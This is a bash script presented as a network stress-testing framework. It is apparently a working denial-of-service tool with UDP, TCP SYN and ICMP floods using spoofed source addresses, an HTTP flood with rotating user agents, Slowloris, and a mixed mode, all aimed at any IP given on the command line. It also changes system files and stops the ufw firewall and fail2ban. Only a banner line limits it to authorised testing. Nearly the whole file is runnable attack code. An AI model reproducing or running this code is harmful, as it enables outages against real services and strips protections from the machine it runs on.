#!/bin/bash

# NetDub Shell - Ultra High Performance Network Stress Testing
# Requires: Root privileges, Linux kernel 4.14+
# Target: 1M+ PPS capability

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

BANNER="
███╗   ██╗███████╗████████╗██████╗ ██╗   ██╗██████╗     ███████╗██╗  ██╗███████╗██╗     ██╗     
████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║   ██║██╔══██╗    ██╔════╝██║  ██║██╔════╝██║     ██║     
██╔██╗ ██║█████╗     ██║   ██║  ██║██║   ██║██████╔╝    ███████╗███████║█████╗  ██║     ██║     
██║╚██╗██║██╔══╝     ██║   ██║  ██║██║   ██║██╔══██╗    ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║ ╚████║███████╗   ██║   ██████╔╝╚██████╔╝██████╔╝    ███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═════╝  ╚═════╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
"

TARGET_IP=""
TARGET_PORT=80
ATTACK_TYPE=1
THREADS=1000
DURATION=300
PAYLOAD_SIZE=1400
PPS_TARGET=1000000
ATTACK_PID=()

print_banner() {
    clear
    echo -e "${PURPLE}$BANNER${NC}"
    echo -e "${WHITE}════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}    ⚠️  ULTRA HIGH PERFORMANCE NETWORK STRESS TESTING FRAMEWORK  ⚠️${NC}"
    echo -e "${WHITE}              [ROOT PRIVILEGES MANDATORY - 1M+ PPS CAPABLE]${NC}"
    echo -e "${WHITE}════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}                    🔥 FOR AUTHORIZED TESTING ONLY 🔥${NC}"
    echo -e "${WHITE}════════════════════════════════════════════════════════════════════════════${NC}\n"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[CRITICAL] This script must be run as ROOT for maximum performance${NC}"
        echo -e "${YELLOW}Usage: sudo $0${NC}"
        exit 1
    fi
}

check_dependencies() {
    echo -e "${BLUE}[INFO] Checking system dependencies...${NC}"
    
    local deps=("hping3" "nmap" "curl" "netcat" "ss" "iptables" "tc")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[WARN] Installing missing dependencies: ${missing[*]}${NC}"
        apt-get update -qq
        apt-get install -y hping3 nmap curl netcat-openbsd iproute2 iptables &> /dev/null
    fi
    
    echo -e "${GREEN}[OK] Dependencies check completed${NC}"
}

optimize_system() {
    echo -e "${BLUE}[INFO] Applying ultra-high performance optimizations...${NC}"
    
    # Network buffer optimizations
    echo 'net.core.rmem_max = 268435456' >> /etc/sysctl.conf
    echo 'net.core.wmem_max = 268435456' >> /etc/sysctl.conf
    echo 'net.core.netdev_max_backlog = 100000' >> /etc/sysctl.conf
    echo 'net.core.netdev_budget = 600' >> /etc/sysctl.conf
    echo 'net.ipv4.tcp_rmem = 8192 262144 268435456' >> /etc/sysctl.conf
    echo 'net.ipv4.tcp_wmem = 8192 262144 268435456' >> /etc/sysctl.conf
    echo 'net.ipv4.tcp_congestion_control = bbr' >> /etc/sysctl.conf
    echo 'net.ipv4.tcp_fastopen = 3' >> /etc/sysctl.conf
    echo 'net.ipv4.tcp_low_latency = 1' >> /etc/sysctl.conf
    echo 'net.ipv4.tcp_no_metrics_save = 1' >> /etc/sysctl.conf
    echo 'net.ipv4.ip_local_port_range = 1024 65535' >> /etc/sysctl.conf
    echo 'net.netfilter.nf_conntrack_max = 2000000' >> /etc/sysctl.conf
    echo 'fs.file-max = 2097152' >> /etc/sysctl.conf
    echo 'kernel.pid_max = 4194304' >> /etc/sysctl.conf
    
    sysctl -p &> /dev/null
    
    # Increase file descriptors
    echo '* soft nofile 1048576' >> /etc/security/limits.conf
    echo '* hard nofile 1048576' >> /etc/security/limits.conf
    echo 'root soft nofile 1048576' >> /etc/security/limits.conf
    echo 'root hard nofile 1048576' >> /etc/security/limits.conf
    
    ulimit -n 1048576
    
    # CPU performance
    echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor &> /dev/null
    
    # Disable unnecessary services
    systemctl stop ufw &> /dev/null
    systemctl stop fail2ban &> /dev/null
    
    echo -e "${GREEN}[OK] System optimized for maximum performance${NC}"
}

udp_flood_attack() {
    local target_ip="$1"
    local target_port="$2"
    local thread_id="$3"
    local pps_per_thread="$4"
    
    echo -e "${CYAN}[THREAD-$thread_id] UDP Flood activated: $target_ip:$target_port @ ${pps_per_thread} PPS${NC}"
    
    while true; do
        hping3 -2 -p "$target_port" -i u1 --flood --rand-source "$target_ip" &> /dev/null &
        
        for i in {1..10}; do
            echo -n -e "\\x$(printf "%02x" $((RANDOM%256)))" | nc -u -w1 "$target_ip" "$target_port" &
            echo -n -e "\\x$(printf "%02x" $((RANDOM%256)))" | nc -u -w1 "$target_ip" "$target_port" &
            echo -n -e "\\x$(printf "%02x" $((RANDOM%256)))" | nc -u -w1 "$target_ip" "$target_port" &
        done
        
        usleep 100
    done
}

tcp_syn_flood_attack() {
    local target_ip="$1"
    local target_port="$2"
    local thread_id="$3"
    
    echo -e "${CYAN}[THREAD-$thread_id] TCP SYN Flood activated: $target_ip:$target_port${NC}"
    
    while true; do
        hping3 -S -p "$target_port" -i u1 --flood --rand-source "$target_ip" &> /dev/null &
        
        for port in $(seq 1 1000); do
            nc -z -w1 "$target_ip" "$target_port" &> /dev/null &
            timeout 0.1 bash -c "</dev/tcp/$target_ip/$target_port" &> /dev/null &
        done
        
        usleep 50
    done
}

http_flood_attack() {
    local target_ip="$1"
    local target_port="$2"
    local thread_id="$3"
    
    echo -e "${CYAN}[THREAD-$thread_id] HTTP Flood activated: $target_ip:$target_port${NC}"
    
    local user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    )
    
    local methods=("GET" "POST" "HEAD" "OPTIONS" "PUT" "DELETE")
    local paths=("/" "/index.html" "/api" "/login" "/admin" "/wp-admin" "/config")
    
    while true; do
        for i in {1..100}; do
            local ua="${user_agents[$RANDOM % ${#user_agents[@]}]}"
            local method="${methods[$RANDOM % ${#methods[@]}]}"
            local path="${paths[$RANDOM % ${#paths[@]}]}"
            local payload=$(head -c 1000 </dev/urandom | tr -dc 'a-zA-Z0-9')
            
            if [[ "$method" == "GET" || "$method" == "HEAD" ]]; then
                curl -s -m 1 -X "$method" -H "User-Agent: $ua" \
                     -H "Connection: keep-alive" \
                     -H "Cache-Control: no-cache" \
                     "http://$target_ip:$target_port$path" &> /dev/null &
            else
                curl -s -m 1 -X "$method" -H "User-Agent: $ua" \
                     -H "Content-Type: application/x-www-form-urlencoded" \
                     -H "Connection: keep-alive" \
                     -d "$payload" \
                     "http://$target_ip:$target_port$path" &> /dev/null &
            fi
            
            echo -e "$method $path HTTP/1.1\r\nHost: $target_ip\r\nUser-Agent: $ua\r\n\r\n$payload" | nc -w1 "$target_ip" "$target_port" &> /dev/null &
            
        done
        usleep 10
    done
}

slowloris_attack() {
    local target_ip="$1"
    local target_port="$2"
    local thread_id="$3"
    
    echo -e "${CYAN}[THREAD-$thread_id] Slowloris attack activated: $target_ip:$target_port${NC}"
    
    for conn in {1..1000}; do
        (
            exec 3<>/dev/tcp/"$target_ip"/"$target_port" 2>/dev/null
            echo -e "GET / HTTP/1.1\r\nHost: $target_ip\r\nUser-Agent: SlowHTTPTest\r\nConnection: keep-alive\r\n" >&3
            
            while true; do
                echo -e "X-Random-Header-$RANDOM: $RANDOM\r\n" >&3
                sleep 10
            done
        ) &
    done
}

icmp_flood_attack() {
    local target_ip="$1"
    local thread_id="$2"
    
    echo -e "${CYAN}[THREAD-$thread_id] ICMP Flood activated: $target_ip${NC}"
    
    while true; do
        hping3 -1 -i u1 --flood --rand-source "$target_ip" &> /dev/null &
        
        for i in {1..1000}; do
            ping -c 1 -W 1 -s 65507 "$target_ip" &> /dev/null &
        done
        
        usleep 1
    done
}

mixed_attack() {
    local target_ip="$1"
    local target_port="$2"
    local threads="$3"
    
    echo -e "${RED}[WARNING] Launching MIXED ATTACK with all methods${NC}"
    
    local thread_count=0
    
    # UDP Flood threads (40%)
    for i in $(seq 1 $((threads * 40 / 100))); do
        udp_flood_attack "$target_ip" "$target_port" "$((++thread_count))" &
        ATTACK_PID+=($!)
    done
    
    # TCP SYN Flood threads (30%)
    for i in $(seq 1 $((threads * 30 / 100))); do
        tcp_syn_flood_attack "$target_ip" "$target_port" "$((++thread_count))" &
        ATTACK_PID+=($!)
    done
    
    # HTTP Flood threads (20%)
    for i in $(seq 1 $((threads * 20 / 100))); do
        http_flood_attack "$target_ip" "$target_port" "$((++thread_count))" &
        ATTACK_PID+=($!)
    done
    
    # Slowloris threads (5%)
    for i in $(seq 1 $((threads * 5 / 100))); do
        slowloris_attack "$target_ip" "$target_port" "$((++thread_count))" &
        ATTACK_PID+=($!)
    done
    
    # ICMP Flood threads (5%)
    for i in $(seq 1 $((threads * 5 / 100))); do
        icmp_flood_attack "$target_ip" "$((++thread_count))" &
        ATTACK_PID+=($!)
    done
}

launch_attack() {
    local target_ip="$1"
    local target_port="$2"
    local attack_type="$3"
    local threads="$4"
    
    echo -e "${RED}[ATTACK] Launching $threads threads against $target_ip:$target_port${NC}"
    
    case $attack_type in
        1)
            echo -e "${YELLOW}[MODE] UDP Flood Attack${NC}"
            local pps_per_thread=$((PPS_TARGET / threads))
            for i in $(seq 1 "$threads"); do
                udp_flood_attack "$target_ip" "$target_port" "$i" "$pps_per_thread" &
                ATTACK_PID+=($!)
            done
            ;;
        2)
            echo -e "${YELLOW}[MODE] TCP SYN Flood Attack${NC}"
            for i in $(seq 1 "$threads"); do
                tcp_syn_flood_attack "$target_ip" "$target_port" "$i" &
                ATTACK_PID+=($!)
            done
            ;;
        3)
            echo -e "${YELLOW}[MODE] HTTP Flood Attack${NC}"
            for i in $(seq 1 "$threads"); do
                http_flood_attack "$target_ip" "$target_port" "$i" &
                ATTACK_PID+=($!)
            done
            ;;
        4)
            echo -e "${YELLOW}[MODE] Mixed Attack (All Methods)${NC}"
            mixed_attack "$target_ip" "$target_port" "$threads"
            ;;
        *)
            echo -e "${RED}[ERROR] Invalid attack type${NC}"
            exit 1
            ;;
    esac
}

monitor_attack() {
    echo -e "${BLUE}[INFO] Starting attack monitoring...${NC}"
    
    while true; do
        local active_connections=$(ss -s | grep -o '[0-9]*' | head -1)
        local cpu_usage=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
        local mem_usage=$(free | grep Mem | awk '{printf("%.1f", $3/$2 * 100.0)}')
        local network_tx=$(cat /proc/net/dev | grep eth0 | awk '{print $10}' | head -1)
        
        printf "\r${WHITE}[STATS]${NC} Active: ${GREEN}%s${NC} | CPU: ${YELLOW}%.1f%%${NC} | MEM: ${YELLOW}%s%%${NC} | TX: ${CYAN}%s${NC}    " \
               "${active_connections:-0}" "${cpu_usage:-0}" "${mem_usage:-0}" "${network_tx:-0}"
        
        sleep 2
    done
}

cleanup() {
    echo -e "\n${RED}[CLEANUP] Stopping all attack processes...${NC}"
    
    for pid in "${ATTACK_PID[@]}"; do
        kill -9 "$pid" 2>/dev/null
    done
    
    killall hping3 2>/dev/null
    killall nc 2>/dev/null
    killall curl 2>/dev/null
    
    echo -e "${GREEN}[OK] Attack stopped successfully${NC}"
    exit 0
}

show_menu() {
    echo -e "${WHITE}═══════════════════════════════════════${NC}"
    echo -e "${WHITE}           ATTACK SELECTION MENU        ${NC}"
    echo -e "${WHITE}═══════════════════════════════════════${NC}"
    echo -e "${CYAN}1.${NC} UDP Flood      - High volume UDP packets"
    echo -e "${CYAN}2.${NC} TCP SYN Flood  - Connection exhaustion"
    echo -e "${CYAN}3.${NC} HTTP Flood     - Application layer stress"
    echo -e "${CYAN}4.${NC} Mixed Attack   - All methods combined"
    echo -e "${WHITE}═══════════════════════════════════════${NC}"
}

main() {
    print_banner
    check_root
    check_dependencies
    optimize_system
    
    trap cleanup SIGINT SIGTERM
    
    if [[ $# -lt 2 ]]; then
        echo -e "${YELLOW}Usage: $0 <target_ip> <target_port> [attack_type] [threads] [duration]${NC}"
        echo -e "${YELLOW}Example: $0 192.168.1.100 80 4 1000 300${NC}"
        exit 1
    fi
    
    TARGET_IP="$1"
    TARGET_PORT="$2"
    ATTACK_TYPE="${3:-1}"
    THREADS="${4:-1000}"
    DURATION="${5:-300}"
    
    echo -e "${WHITE}═══════════════════════════════════════${NC}"
    echo -e "${WHITE}           ATTACK CONFIGURATION         ${NC}"
    echo -e "${WHITE}═══════════════════════════════════════${NC}"
    echo -e "${GREEN}Target IP:${NC}     $TARGET_IP"
    echo -e "${GREEN}Target Port:${NC}   $TARGET_PORT"
    echo -e "${GREEN}Attack Type:${NC}   $ATTACK_TYPE"
    echo -e "${GREEN}Threads:${NC}       $THREADS"
    echo -e "${GREEN}Duration:${NC}      $DURATION seconds"
    echo -e "${GREEN}Target PPS:${NC}    $PPS_TARGET"
    echo -e "${WHITE}═══════════════════════════════════════${NC}"
    
    read -p "$(echo -e ${YELLOW}"Press ENTER to start attack or Ctrl+C to cancel..."${NC})"
    
    echo -e "${RED}[ATTACK] INITIATING HIGH-INTENSITY NETWORK STRESS TEST${NC}"
    echo -e "${RED}[WARNING] This will generate massive network traffic${NC}"
    
    launch_attack "$TARGET_IP" "$TARGET_PORT" "$ATTACK_TYPE" "$THREADS" &
    
    monitor_attack &
    MONITOR_PID=$!
    
    sleep "$DURATION"
    
    echo -e "\n${YELLOW}[INFO] Attack duration completed${NC}"
    cleanup
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
